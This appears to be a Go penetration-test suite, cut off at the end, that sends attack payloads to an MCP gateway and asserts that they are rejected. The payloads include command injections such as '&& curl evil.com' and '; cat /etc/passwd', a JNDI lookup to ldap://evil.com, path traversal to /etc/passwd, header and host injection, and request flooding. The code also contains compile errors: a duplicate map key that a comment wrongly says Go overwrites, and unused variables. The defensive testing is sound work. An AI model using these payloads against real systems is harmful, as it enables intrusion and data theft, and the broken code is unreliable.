package security

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap/zaptest"
)

// TestSecurityPenetrationTesting performs security penetration tests
func TestSecurityPenetrationTesting(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping penetration testing in short mode")
	}

	// Only run in security testing environment
	if os.Getenv("SECURITY_TESTING") != "true" {
		t.Skip("Skipping penetration testing - set SECURITY_TESTING=true to run")
	}

	logger := zaptest.NewLogger(t)
	config := getPenetrationTestConfig(t)

	t.Run("AuthenticationBypassAttempts", func(t *testing.T) {
		testAuthenticationBypassAttempts(t, config)
	})

	t.Run("AuthorizationEscalationAttempts", func(t *testing.T) {
		testAuthorizationEscalationAttempts(t, config)
	})

	t.Run("InjectionAttacks", func(t *testing.T) {
		testInjectionAttacks(t, config)
	})

	t.Run("PathTraversalAttacks", func(t *testing.T) {
		testPathTraversalAttacks(t, config)
	})

	t.Run("DenialOfServiceAttacks", func(t *testing.T) {
		testDenialOfServiceAttacks(t, config)
	})

	t.Run("TLSSecurityTesting", func(t *testing.T) {
		testTLSSecurityTesting(t, config)
	})

	t.Run("HeaderInjectionAttacks", func(t *testing.T) {
		testHeaderInjectionAttacks(t, config)
	})

	t.Run("SessionManagementAttacks", func(t *testing.T) {
		testSessionManagementAttacks(t, config)
	})

	t.Run("InformationDisclosureTests", func(t *testing.T) {
		testInformationDisclosureTests(t, config)
	})

	t.Run("BusinessLogicFlaws", func(t *testing.T) {
		testBusinessLogicFlaws(t, config)
	})
}

type PenetrationTestConfig struct {
	TargetURL    string
	ValidToken   string
	InvalidToken string
	AdminToken   string
	TestTimeout  time.Duration
}

func getPenetrationTestConfig(t *testing.T) *PenetrationTestConfig {
	config := &PenetrationTestConfig{
		TargetURL:    getEnvOrDefault("PENTEST_TARGET_URL", "https://airlock.example.com"),
		ValidToken:   os.Getenv("PENTEST_VALID_TOKEN"),
		InvalidToken: "invalid.jwt.token",
		AdminToken:   os.Getenv("PENTEST_ADMIN_TOKEN"),
		TestTimeout:  30 * time.Second,
	}

	if config.ValidToken == "" {
		t.Skip("PENTEST_VALID_TOKEN not provided, skipping penetration tests")
	}

	return config
}

func testAuthenticationBypassAttempts(t *testing.T, config *PenetrationTestConfig) {
	client := createInsecureClient(config.TestTimeout)

	// Test 1: Missing Authorization header
	t.Run("MissingAuthorizationHeader", func(t *testing.T) {
		request := createMCPRequest("test-missing-auth", "tools/list", nil)

		resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "")
		require.NoError(t, err)
		defer resp.Body.Close()

		assert.Equal(t, http.StatusUnauthorized, resp.StatusCode,
			"Should reject requests without authorization")
		assert.Contains(t, resp.Header.Get("WWW-Authenticate"), "Bearer")
	})

	// Test 2: Invalid token format
	t.Run("InvalidTokenFormat", func(t *testing.T) {
		invalidTokens := []string{
			"Bearer invalid",
			"Bearer ",
			"Basic dGVzdDp0ZXN0", // Basic auth instead of Bearer
			"Bearer not.a.jwt",
			"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", // Incomplete JWT
		}

		for i, token := range invalidTokens {
			t.Run(fmt.Sprintf("InvalidToken_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-invalid-token", "tools/list", nil)

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, token)
				require.NoError(t, err)
				defer resp.Body.Close()

				assert.Equal(t, http.StatusUnauthorized, resp.StatusCode,
					"Should reject invalid token format: %s", token)
			})
		}
	})

	// Test 3: Expired token
	t.Run("ExpiredToken", func(t *testing.T) {
		// Create an obviously expired token
		expiredToken := "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxfQ.invalid"

		request := createMCPRequest("test-expired-token", "tools/list", nil)

		resp, err := makeRequest(client, config.TargetURL+"/mcp", request, expiredToken)
		require.NoError(t, err)
		defer resp.Body.Close()

		assert.Equal(t, http.StatusUnauthorized, resp.StatusCode,
			"Should reject expired tokens")
	})

	// Test 4: Token manipulation attempts
	t.Run("TokenManipulation", func(t *testing.T) {
		if config.ValidToken == "" {
			t.Skip("Valid token not available for manipulation test")
		}

		// Try to manipulate the valid token
		manipulatedTokens := []string{
			config.ValidToken + "extra",
			strings.Replace(config.ValidToken, ".", "x", 1),
			strings.ToUpper(config.ValidToken),
			config.ValidToken[:len(config.ValidToken)-5] + "xxxxx",
		}

		for i, token := range manipulatedTokens {
			t.Run(fmt.Sprintf("ManipulatedToken_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-manipulated-token", "tools/list", nil)

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+token)
				require.NoError(t, err)
				defer resp.Body.Close()

				assert.Equal(t, http.StatusUnauthorized, resp.StatusCode,
					"Should reject manipulated tokens")
			})
		}
	})

	// Test 5: Authorization header injection
	t.Run("AuthorizationHeaderInjection", func(t *testing.T) {
		injectionAttempts := []string{
			"Bearer " + config.ValidToken + "\r\nX-Admin: true",
			"Bearer " + config.ValidToken + "\nContent-Type: application/json",
			"Bearer " + config.ValidToken + "; admin=true",
		}

		for i, authHeader := range injectionAttempts {
			t.Run(fmt.Sprintf("HeaderInjection_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-header-injection", "tools/list", nil)

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, authHeader)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should either reject or ignore the injection
				assert.True(t, resp.StatusCode == http.StatusUnauthorized ||
					resp.StatusCode == http.StatusBadRequest,
					"Should handle header injection attempts")
			})
		}
	})
}

func testAuthorizationEscalationAttempts(t *testing.T, config *PenetrationTestConfig) {
	client := createInsecureClient(config.TestTimeout)

	// Test 1: Admin endpoint access with regular token
	t.Run("AdminEndpointAccess", func(t *testing.T) {
		adminEndpoints := []string{
			"/admin/users",
			"/admin/config",
			"/admin/audit",
			"/admin/policy/reload",
			"/admin/system/shutdown",
		}

		for _, endpoint := range adminEndpoints {
			t.Run(fmt.Sprintf("AdminEndpoint_%s", strings.ReplaceAll(endpoint, "/", "_")), func(t *testing.T) {
				req, err := http.NewRequest("GET", config.TargetURL+endpoint, nil)
				require.NoError(t, err)
				req.Header.Set("Authorization", "Bearer "+config.ValidToken)

				resp, err := client.Do(req)
				require.NoError(t, err)
				defer resp.Body.Close()

				assert.True(t, resp.StatusCode == http.StatusForbidden ||
					resp.StatusCode == http.StatusNotFound,
					"Regular user should not access admin endpoint: %s", endpoint)
			})
		}
	})

	// Test 2: Privilege escalation through MCP tools
	t.Run("PrivilegeEscalationThroughTools", func(t *testing.T) {
		escalationAttempts := []map[string]interface{}{
			{
				"name": "admin_tool",
				"arguments": map[string]interface{}{
					"action": "create_user",
					"role":   "admin",
				},
			},
			{
				"name": "system_command",
				"arguments": map[string]interface{}{
					"command": "sudo su -",
				},
			},
			{
				"name": "file_access",
				"arguments": map[string]interface{}{
					"path": "/etc/shadow",
				},
			},
		}

		for i, toolCall := range escalationAttempts {
			t.Run(fmt.Sprintf("EscalationAttempt_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-escalation", "tools/call", map[string]interface{}{
					"name":      toolCall["name"],
					"arguments": toolCall["arguments"],
				})

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should be denied by policy
				if resp.StatusCode == http.StatusOK {
					var response map[string]interface{}
					body, _ := io.ReadAll(resp.Body)
					json.Unmarshal(body, &response)

					// Should have error in response
					assert.NotNil(t, response["error"],
						"Privilege escalation attempt should be denied")
				} else {
					assert.Equal(t, http.StatusForbidden, resp.StatusCode)
				}
			})
		}
	})

	// Test 3: Cross-tenant access attempts
	t.Run("CrossTenantAccess", func(t *testing.T) {
		crossTenantAttempts := []map[string]interface{}{
			{
				"name": "read_file",
				"arguments": map[string]interface{}{
					"path": "mcp://repo/../other-tenant/secrets.txt",
				},
			},
			{
				"name": "list_directory",
				"arguments": map[string]interface{}{
					"path": "mcp://artifacts/other-tenant/",
				},
			},
		}

		for i, toolCall := range crossTenantAttempts {
			t.Run(fmt.Sprintf("CrossTenantAttempt_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-cross-tenant", "tools/call", map[string]interface{}{
					"name":      toolCall["name"],
					"arguments": toolCall["arguments"],
				})

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should be denied
				assert.True(t, resp.StatusCode == http.StatusForbidden ||
					resp.StatusCode == http.StatusBadRequest,
					"Cross-tenant access should be denied")
			})
		}
	})
}

func testInjectionAttacks(t *testing.T, config *PenetrationTestConfig) {
	client := createInsecureClient(config.TestTimeout)

	// Test 1: JSON injection attacks
	t.Run("JSONInjectionAttacks", func(t *testing.T) {
		injectionPayloads := []string{
			`{"jsonrpc": "2.0", "id": "test", "method": "tools/call", "params": {"name": "test", "arguments": {"query": "'; DROP TABLE users; --"}}}`,
			`{"jsonrpc": "2.0", "id": "test", "method": "tools/call", "params": {"name": "test", "arguments": {"query": "<script>alert('xss')</script>"}}}`,
			`{"jsonrpc": "2.0", "id": "test", "method": "tools/call", "params": {"name": "test", "arguments": {"query": "${jndi:ldap://evil.com/exploit}"}}}`,
			`{"jsonrpc": "2.0", "id": "test", "method": "tools/call", "params": {"name": "test", "arguments": {"query": "{{7*7}}"}}}`,
		}

		for i, payload := range injectionPayloads {
			t.Run(fmt.Sprintf("JSONInjection_%d", i), func(t *testing.T) {
				req, err := http.NewRequest("POST", config.TargetURL+"/mcp", strings.NewReader(payload))
				require.NoError(t, err)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer "+config.ValidToken)

				resp, err := client.Do(req)
				require.NoError(t, err)
				defer resp.Body.Close()

				body, _ := io.ReadAll(resp.Body)
				bodyStr := string(body)

				// Should not execute injection
				assert.NotContains(t, bodyStr, "49", "Template injection should not execute")
				assert.NotContains(t, bodyStr, "<script>", "XSS should be prevented")
				assert.NotContains(t, bodyStr, "DROP TABLE", "SQL injection should be prevented")
			})
		}
	})

	// Test 2: Command injection through tool arguments
	t.Run("CommandInjectionAttacks", func(t *testing.T) {
		commandInjectionPayloads := []string{
			"; cat /etc/passwd",
			"| whoami",
			"&& curl evil.com",
			"`id`",
			"$(whoami)",
			"\n/bin/sh",
		}

		for i, payload := range commandInjectionPayloads {
			t.Run(fmt.Sprintf("CommandInjection_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-cmd-injection", "tools/call", map[string]interface{}{
					"name": "system_tool",
					"arguments": map[string]interface{}{
						"command": "ls " + payload,
					},
				})

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				require.NoError(t, err)
				defer resp.Body.Close()

				body, _ := io.ReadAll(resp.Body)
				bodyStr := string(body)

				// Should not execute command injection
				assert.NotContains(t, bodyStr, "root:", "Command injection should be prevented")
				assert.NotContains(t, bodyStr, "uid=", "Command injection should be prevented")
			})
		}
	})

	// Test 3: LDAP injection attacks
	t.Run("LDAPInjectionAttacks", func(t *testing.T) {
		ldapInjectionPayloads := []string{
			"*)(uid=*))(|(uid=*",
			"admin)(&(password=*))",
			"*)(|(objectClass=*",
		}

		for i, payload := range ldapInjectionPayloads {
			t.Run(fmt.Sprintf("LDAPInjection_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-ldap-injection", "tools/call", map[string]interface{}{
					"name": "user_lookup",
					"arguments": map[string]interface{}{
						"username": payload,
					},
				})

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should handle LDAP injection safely
				assert.True(t, resp.StatusCode == http.StatusOK ||
					resp.StatusCode == http.StatusBadRequest,
					"LDAP injection should be handled safely")
			})
		}
	})
}

func testPathTraversalAttacks(t *testing.T, config *PenetrationTestConfig) {
	client := createInsecureClient(config.TestTimeout)

	// Test 1: Directory traversal attacks
	t.Run("DirectoryTraversalAttacks", func(t *testing.T) {
		traversalPayloads := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"....//....//....//etc/passwd",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			"..%252f..%252f..%252fetc%252fpasswd",
			"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		}

		for i, payload := range traversalPayloads {
			t.Run(fmt.Sprintf("PathTraversal_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-path-traversal", "tools/call", map[string]interface{}{
					"name": "read_file",
					"arguments": map[string]interface{}{
						"path": "mcp://repo/" + payload,
					},
				})

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				require.NoError(t, err)
				defer resp.Body.Close()

				body, _ := io.ReadAll(resp.Body)
				bodyStr := string(body)

				// Should not allow path traversal
				assert.NotContains(t, bodyStr, "root:", "Path traversal should be prevented")
				assert.NotContains(t, bodyStr, "Administrator", "Path traversal should be prevented")

				// Should get error response
				if resp.StatusCode == http.StatusOK {
					var response map[string]interface{}
					json.Unmarshal(body, &response)
					assert.NotNil(t, response["error"], "Path traversal should result in error")
				}
			})
		}
	})

	// Test 2: URL encoding bypass attempts
	t.Run("URLEncodingBypass", func(t *testing.T) {
		encodedPayloads := []string{
			"mcp%3A%2F%2Frepo%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"mcp://repo/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			"mcp://repo/..%2f..%2f..%2fetc%2fpasswd",
		}

		for i, payload := range encodedPayloads {
			t.Run(fmt.Sprintf("URLEncodingBypass_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-url-encoding", "tools/call", map[string]interface{}{
					"name": "read_file",
					"arguments": map[string]interface{}{
						"path": payload,
					},
				})

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should not allow encoded path traversal
				body, _ := io.ReadAll(resp.Body)
				bodyStr := string(body)
				assert.NotContains(t, bodyStr, "root:", "Encoded path traversal should be prevented")
			})
		}
	})

	// Test 3: Null byte injection
	t.Run("NullByteInjection", func(t *testing.T) {
		nullBytePayloads := []string{
			"mcp://repo/safe.txt%00../../../etc/passwd",
			"mcp://repo/safe.txt\x00../../../etc/passwd",
		}

		for i, payload := range nullBytePayloads {
			t.Run(fmt.Sprintf("NullByteInjection_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-null-byte", "tools/call", map[string]interface{}{
					"name": "read_file",
					"arguments": map[string]interface{}{
						"path": payload,
					},
				})

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should not allow null byte injection
				body, _ := io.ReadAll(resp.Body)
				bodyStr := string(body)
				assert.NotContains(t, bodyStr, "root:", "Null byte injection should be prevented")
			})
		}
	})
}

func testDenialOfServiceAttacks(t *testing.T, config *PenetrationTestConfig) {
	client := createInsecureClient(config.TestTimeout)

	// Test 1: Large payload attacks
	t.Run("LargePayloadAttacks", func(t *testing.T) {
		// Create large payload
		largeData := strings.Repeat("A", 10*1024*1024) // 10MB

		request := createMCPRequest("test-large-payload", "tools/call", map[string]interface{}{
			"name": "process_data",
			"arguments": map[string]interface{}{
				"data": largeData,
			},
		})

		resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
		require.NoError(t, err)
		defer resp.Body.Close()

		// Should reject large payloads
		assert.True(t, resp.StatusCode == http.StatusRequestEntityTooLarge ||
			resp.StatusCode == http.StatusBadRequest,
			"Large payloads should be rejected")
	})

	// Test 2: Rapid request flooding
	t.Run("RapidRequestFlooding", func(t *testing.T) {
		numRequests := 100
		concurrency := 10

		var wg sync.WaitGroup
		rateLimitHit := false
		var rateLimitMutex sync.Mutex

		for i := 0; i < concurrency; i++ {
			wg.Add(1)
			go func(workerID int) {
				defer wg.Done()

				for j := 0; j < numRequests/concurrency; j++ {
					request := createMCPRequest(fmt.Sprintf("flood-%d-%d", workerID, j), "tools/call", map[string]interface{}{
						"name": "test_tool",
					})

					resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
					if err != nil {
						continue
					}
					resp.Body.Close()

					if resp.StatusCode == http.StatusTooManyRequests {
						rateLimitMutex.Lock()
						rateLimitHit = true
						rateLimitMutex.Unlock()
					}
				}
			}(i)
		}

		wg.Wait()

		// Rate limiting should kick in
		assert.True(t, rateLimitHit, "Rate limiting should prevent flooding")
	})

	// Test 3: Slowloris-style attacks
	t.Run("SlowlorisAttacks", func(t *testing.T) {
		// Create slow request
		req, err := http.NewRequest("POST", config.TargetURL+"/mcp", nil)
		require.NoError(t, err)
		req.Header.Set("Authorization", "Bearer "+config.ValidToken)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Content-Length", "1000000") // Claim large content

		// Don't send body, just headers
		client := &http.Client{Timeout: 5 * time.Second}

		start := time.Now()
		resp, err := client.Do(req)
		duration := time.Since(start)

		if err != nil {
			// Should timeout quickly
			assert.Less(t, duration, 10*time.Second, "Should timeout slow requests quickly")
		} else {
			defer resp.Body.Close()
			// Should reject incomplete requests
			assert.True(t, resp.StatusCode >= 400, "Should reject incomplete requests")
		}
	})

	// Test 4: Resource exhaustion through complex operations
	t.Run("ResourceExhaustionAttacks", func(t *testing.T) {
		complexOperations := []map[string]interface{}{
			{
				"name": "complex_calculation",
				"arguments": map[string]interface{}{
					"iterations": 1000000,
					"complexity": "high",
				},
			},
			{
				"name": "memory_intensive_operation",
				"arguments": map[string]interface{}{
					"size": "1GB",
				},
			},
		}

		for i, operation := range complexOperations {
			t.Run(fmt.Sprintf("ResourceExhaustion_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-resource-exhaustion", "tools/call", operation)

				start := time.Now()
				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				duration := time.Since(start)

				if err == nil {
					defer resp.Body.Close()
				}

				// Should either timeout or reject resource-intensive operations
				assert.True(t, duration < 30*time.Second ||
					(resp != nil && resp.StatusCode >= 400),
					"Resource-intensive operations should be limited")
			})
		}
	})
}

func testTLSSecurityTesting(t *testing.T, config *PenetrationTestConfig) {
	if !strings.HasPrefix(config.TargetURL, "https://") {
		t.Skip("TLS testing requires HTTPS endpoint")
	}

	// Test 1: Weak cipher suites
	t.Run("WeakCipherSuites", func(t *testing.T) {
		weakCiphers := []uint16{
			tls.TLS_RSA_WITH_RC4_128_SHA,
			tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
		}

		for _, cipher := range weakCiphers {
			t.Run(fmt.Sprintf("WeakCipher_%x", cipher), func(t *testing.T) {
				client := &http.Client{
					Timeout: 10 * time.Second,
					Transport: &http.Transport{
						TLSClientConfig: &tls.Config{
							CipherSuites: []uint16{cipher},
						},
					},
				}

				_, err := client.Get(config.TargetURL + "/live")

				// Should reject weak ciphers
				assert.Error(t, err, "Should reject weak cipher suite %x", cipher)
			})
		}
	})

	// Test 2: SSL/TLS version downgrade
	t.Run("TLSVersionDowngrade", func(t *testing.T) {
		oldVersions := []uint16{
			tls.VersionSSL30,
			tls.VersionTLS10,
			tls.VersionTLS11,
		}

		for _, version := range oldVersions {
			t.Run(fmt.Sprintf("TLSVersion_%x", version), func(t *testing.T) {
				client := &http.Client{
					Timeout: 10 * time.Second,
					Transport: &http.Transport{
						TLSClientConfig: &tls.Config{
							MaxVersion: version,
						},
					},
				}

				_, err := client.Get(config.TargetURL + "/live")

				// Should reject old TLS versions
				assert.Error(t, err, "Should reject TLS version %x", version)
			})
		}
	})

	// Test 3: Certificate validation bypass
	t.Run("CertificateValidationBypass", func(t *testing.T) {
		client := &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}

		resp, err := client.Get(config.TargetURL + "/live")
		require.NoError(t, err)
		defer resp.Body.Close()

		// Even with skip verify, connection should work
		assert.Equal(t, http.StatusOK, resp.StatusCode)

		// But in production, this should be disabled
		t.Log("WARNING: Certificate validation bypass test passed - ensure this is disabled in production")
	})
}

func testHeaderInjectionAttacks(t *testing.T, config *PenetrationTestConfig) {
	client := createInsecureClient(config.TestTimeout)

	// Test 1: HTTP header injection
	t.Run("HTTPHeaderInjection", func(t *testing.T) {
		injectionHeaders := map[string]string{
			"X-Forwarded-For": "127.0.0.1\r\nX-Admin: true",
			"User-Agent":      "Mozilla/5.0\r\nX-Inject: header",
			"Content-Type":    "application/json\r\nAuthorization: Bearer admin",
			"X-Real-IP":       "192.168.1.1\nSet-Cookie: admin=true",
		}

		for headerName, headerValue := range injectionHeaders {
			t.Run(fmt.Sprintf("HeaderInjection_%s", headerName), func(t *testing.T) {
				request := createMCPRequest("test-header-injection", "tools/list", nil)

				req, err := http.NewRequest("POST", config.TargetURL+"/mcp", bytes.NewReader(request))
				require.NoError(t, err)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer "+config.ValidToken)
				req.Header.Set(headerName, headerValue)

				resp, err := client.Do(req)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should handle header injection safely
				assert.True(t, resp.StatusCode < 500, "Header injection should not cause server error")

				// Check that injected headers are not reflected
				for respHeaderName, respHeaderValues := range resp.Header {
					for _, respHeaderValue := range respHeaderValues {
						assert.NotContains(t, respHeaderValue, "X-Admin",
							"Injected headers should not be reflected")
						assert.NotContains(t, respHeaderValue, "X-Inject",
							"Injected headers should not be reflected")
					}
				}
			})
		}
	})

	// Test 2: Host header injection
	t.Run("HostHeaderInjection", func(t *testing.T) {
		maliciousHosts := []string{
			"evil.com",
			"localhost:8080\r\nX-Forwarded-Host: evil.com",
			"airlock.example.com\nHost: evil.com",
		}

		for i, host := range maliciousHosts {
			t.Run(fmt.Sprintf("HostInjection_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-host-injection", "tools/list", nil)

				req, err := http.NewRequest("POST", config.TargetURL+"/mcp", bytes.NewReader(request))
				require.NoError(t, err)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer "+config.ValidToken)
				req.Host = host

				resp, err := client.Do(req)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should handle host header injection safely
				assert.True(t, resp.StatusCode < 500, "Host header injection should not cause server error")
			})
		}
	})
}

func testSessionManagementAttacks(t *testing.T, config *PenetrationTestConfig) {
	client := createInsecureClient(config.TestTimeout)

	// Test 1: Session fixation
	t.Run("SessionFixation", func(t *testing.T) {
		// Try to set session ID
		request := createMCPRequest("test-session-fixation", "tools/list", nil)

		req, err := http.NewRequest("POST", config.TargetURL+"/mcp", bytes.NewReader(request))
		require.NoError(t, err)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer "+config.ValidToken)
		req.Header.Set("Cookie", "JSESSIONID=fixed-session-id")

		resp, err := client.Do(req)
		require.NoError(t, err)
		defer resp.Body.Close()

		// Should not accept fixed session IDs
		cookies := resp.Cookies()
		for _, cookie := range cookies {
			assert.NotEqual(t, "fixed-session-id", cookie.Value,
				"Should not accept fixed session IDs")
		}
	})

	// Test 2: Session hijacking attempts
	t.Run("SessionHijacking", func(t *testing.T) {
		hijackingAttempts := []string{
			"JSESSIONID=../../../etc/passwd",
			"SESSIONID=<script>alert('xss')</script>",
			"AUTH_TOKEN=" + config.ValidToken + "; admin=true",
		}

		for i, cookieValue := range hijackingAttempts {
			t.Run(fmt.Sprintf("SessionHijacking_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-session-hijacking", "tools/list", nil)

				req, err := http.NewRequest("POST", config.TargetURL+"/mcp", bytes.NewReader(request))
				require.NoError(t, err)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer "+config.ValidToken)
				req.Header.Set("Cookie", cookieValue)

				resp, err := client.Do(req)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should handle session hijacking attempts safely
				assert.True(t, resp.StatusCode < 500, "Session hijacking should not cause server error")
			})
		}
	})
}

func testInformationDisclosureTests(t *testing.T, config *PenetrationTestConfig) {
	client := createInsecureClient(config.TestTimeout)

	// Test 1: Error message information disclosure
	t.Run("ErrorMessageDisclosure", func(t *testing.T) {
		// Send malformed requests to trigger errors
		malformedRequests := []string{
			`{"jsonrpc": "2.0"}`, // Missing required fields
			`{"jsonrpc": "1.0", "id": "test", "method": "invalid"}`, // Wrong version
			`{"invalid": "json"}`, // Invalid JSON-RPC
		}

		for i, payload := range malformedRequests {
			t.Run(fmt.Sprintf("ErrorDisclosure_%d", i), func(t *testing.T) {
				req, err := http.NewRequest("POST", config.TargetURL+"/mcp", strings.NewReader(payload))
				require.NoError(t, err)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer "+config.ValidToken)

				resp, err := client.Do(req)
				require.NoError(t, err)
				defer resp.Body.Close()

				body, _ := io.ReadAll(resp.Body)
				bodyStr := string(body)

				// Should not disclose sensitive information in errors
				assert.NotContains(t, bodyStr, "/etc/", "Should not disclose file paths")
				assert.NotContains(t, bodyStr, "password", "Should not disclose passwords")
				assert.NotContains(t, bodyStr, "secret", "Should not disclose secrets")
				assert.NotContains(t, bodyStr, "stack trace", "Should not disclose stack traces")
			})
		}
	})

	// Test 2: Debug information disclosure
	t.Run("DebugInformationDisclosure", func(t *testing.T) {
		debugEndpoints := []string{
			"/debug/pprof/",
			"/debug/vars",
			"/debug/requests",
			"/.env",
			"/config.yaml",
			"/swagger.json",
		}

		for _, endpoint := range debugEndpoints {
			t.Run(fmt.Sprintf("DebugEndpoint_%s", strings.ReplaceAll(endpoint, "/", "_")), func(t *testing.T) {
				resp, err := client.Get(config.TargetURL + endpoint)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Debug endpoints should not be accessible
				assert.True(t, resp.StatusCode == http.StatusNotFound ||
					resp.StatusCode == http.StatusForbidden,
					"Debug endpoint should not be accessible: %s", endpoint)
			})
		}
	})

	// Test 3: Version information disclosure
	t.Run("VersionInformationDisclosure", func(t *testing.T) {
		resp, err := client.Get(config.TargetURL + "/info")
		require.NoError(t, err)
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Should not disclose too much version information
			assert.NotContains(t, bodyStr, "development", "Should not disclose development info")
			assert.NotContains(t, bodyStr, "debug", "Should not disclose debug info")
			assert.NotContains(t, bodyStr, "internal", "Should not disclose internal info")
		}
	})
}

func testBusinessLogicFlaws(t *testing.T, config *PenetrationTestConfig) {
	client := createInsecureClient(config.TestTimeout)

	// Test 1: Race condition attacks
	t.Run("RaceConditionAttacks", func(t *testing.T) {
		numRequests := 10
		var wg sync.WaitGroup
		results := make(chan bool, numRequests)

		// Send concurrent requests that might cause race conditions
		for i := 0; i < numRequests; i++ {
			wg.Add(1)
			go func(reqID int) {
				defer wg.Done()

				request := createMCPRequest(fmt.Sprintf("race-test-%d", reqID), "tools/call", map[string]interface{}{
					"name": "counter_increment",
					"arguments": map[string]interface{}{
						"counter_id": "shared_counter",
					},
				})

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				if err != nil {
					results <- false
					return
				}
				defer resp.Body.Close()

				results <- resp.StatusCode == http.StatusOK
			}(i)
		}

		wg.Wait()
		close(results)

		// Check results
		successCount := 0
		for success := range results {
			if success {
				successCount++
			}
		}

		// All requests should be handled consistently
		assert.True(t, successCount == 0 || successCount == numRequests,
			"Race condition handling should be consistent")
	})

	// Test 2: Business logic bypass
	t.Run("BusinessLogicBypass", func(t *testing.T) {
		bypassAttempts := []map[string]interface{}{
			{
				"name": "transfer_funds",
				"arguments": map[string]interface{}{
					"amount": -1000, // Negative amount
					"from":   "user1",
					"to":     "user2",
				},
			},
			{
				"name": "set_user_role",
				"arguments": map[string]interface{}{
					"user_id": "current_user",
					"role":    "admin", // Self-promotion
				},
			},
		}

		for i, attempt := range bypassAttempts {
			t.Run(fmt.Sprintf("BusinessLogicBypass_%d", i), func(t *testing.T) {
				request := createMCPRequest("test-business-logic", "tools/call", attempt)

				resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Business logic should prevent invalid operations
				if resp.StatusCode == http.StatusOK {
					var response map[string]interface{}
					body, _ := io.ReadAll(resp.Body)
					json.Unmarshal(body, &response)

					assert.NotNil(t, response["error"],
						"Business logic bypass should be prevented")
				} else {
					assert.True(t, resp.StatusCode >= 400,
						"Business logic bypass should be rejected")
				}
			})
		}
	})

	// Test 3: Parameter pollution
	t.Run("ParameterPollution", func(t *testing.T) {
		// Test duplicate parameters
		request := createMCPRequest("test-param-pollution", "tools/call", map[string]interface{}{
			"name": "test_tool",
			"arguments": map[string]interface{}{
				"param1": "value1",
				"param1": "value2", // Duplicate key (will be overwritten in Go)
			},
		})

		resp, err := makeRequest(client, config.TargetURL+"/mcp", request, "Bearer "+config.ValidToken)
		require.NoError(t, err)
		defer resp.Body.Close()

		// Should handle parameter pollution gracefully
		assert.True(t, resp.StatusCode < 500, "Parameter pollution should not cause server error")
	})
}

// Helper functions

func createInsecureClient(timeout time.Duration) *http.Client {
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
